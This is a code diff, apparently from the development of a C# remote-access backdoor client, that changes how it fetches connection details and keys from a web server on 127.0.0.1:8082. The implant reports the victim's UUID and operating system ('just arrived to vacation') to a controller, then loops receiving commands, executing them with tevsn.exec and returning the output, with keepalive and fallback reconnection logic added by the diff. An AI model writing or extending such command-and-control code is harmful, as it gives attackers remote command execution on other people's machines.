@@ -45,7 +45,13 @@ namespace cevsn
                 {
                     while(gotHostInformation == false)
                     {
+                        URL = "http://127.0.0.1:8082/"+UUID+".txt";
                         string cont = getContent();
+                        if(cont == "")
+                        {
+                            URL = URL = "http://127.0.0.1:8082/initialRSA.txt";
+                            cont = getContent();
+                        }
                         parseHostInformation(cont);
                         Thread.Sleep(1000);
                     }
@@ -59,7 +65,7 @@ namespace cevsn
                         }
                         if(Type.Equals("TCP"))
                         {
-                            Console.Write("in tcp\n");
+                            Console.Write("Trying to connect to TCP...\n");
                             if(checker == false)
                             {
                                 tevsn = CreateTevsn(IP, PORT, Key);
@@ -74,27 +80,48 @@ namespace cevsn
                                 {
                                     if(!first)
                                     {
-                                        Console.Write("Sending to Server first Conn!\n");
-                                        tevsn.Send(UUID + ": just arrived to vacation on: " + getOsName());
-                                        URL = "http://127.0.0.1:8082/"+UUID+".txt";
-                                        Thread.Sleep(5000);
-                                        string cont = getContent();
-                                        parseHostInformation(cont);
-                                        tevsn.PrivKey = PrivKey;
-                                        string recv1 = tevsn.Receive();
-                                        tevsn.Send(tevsn.exec(recv1));
-                                        IsConnected = tevsn.IsConnected();
-                                        first = true;
-                                        Thread.Sleep(1000);
+                                        try
+                                        {
+                                            Console.Write("Sending to Server first Conn!\n");
+                                            tevsn.Send(UUID + ": just arrived to vacation on: " + getOsName());
+                                            URL = "http://127.0.0.1:8082/"+UUID+".txt";
+                                            Thread.Sleep(5000);
+                                            try
+                                            {
+                                                string cont = getContent();
+                                                parseHostInformation(cont);
+                                                tevsn.PrivKey = PrivKey;
+                                            } catch (Exception) {
+                                                Console.Write("Failed to get private key!\n");
+                                            }
+                                            string recv1 = tevsn.Receive();
+                                            tevsn.Send(tevsn.exec(recv1));
+                                            IsConnected = tevsn.IsConnected();
+                                            first = true;
+                                            Thread.Sleep(1000);
+                                        } catch (Exception) {
+                                            IsConnected = tevsn.IsConnected();
+                                            if(!IsConnected)
+                                            {
+                                                first = false;
+                                            }
+                                        }
                                     } else {
                                         Console.Write("Waiting");
                                         string recv = tevsn.Receive();
                                         Console.Write(recv);
-                                        if(recv != "--")
-                                        {
-                                            tevsn.Send(tevsn.exec(recv));
-                                        } else {
+                                        if (recv.Equals("reviveTime")) {
+                                            tevsn.Fallback();
+                                            IsConnected = tevsn.IsConnected();
+                                            if(!IsConnected)
+                                            {
+                                                first = false;
+                                            }
+                                        } else if(recv.Equals("--")) {
+                                            
                                             tevsn.Send("keepalive");
+                                        }  else {
+                                            tevsn.Send(tevsn.exec(recv));
                                         }
                                     }
                                     Thread.Sleep(1000);
@@ -135,13 +162,22 @@ namespace cevsn
 
         static String getContent()
         {
-            Task<string> response = client.GetStringAsync(URL);
-            Console.Write(response.Result.ToString() + "\n");
-            return response.Result.ToString();
+            try 
+            {
+                Task<string> response = client.GetStringAsync(URL);
+                Console.Write("Got content from server! \n");
+                    
+                return response.Result.ToString();
+            } catch (Exception)
+            {
+                Console.Write("Trying to connect to webserver..." + "\n");
+                return "";
+            }
+            
         }
 
         public static void parseHostInformation(string content) {
-            if(content is not null)
+            if(content != "")
             {
                 string[] lines = content.Split(';');
                 IP = lines[0];
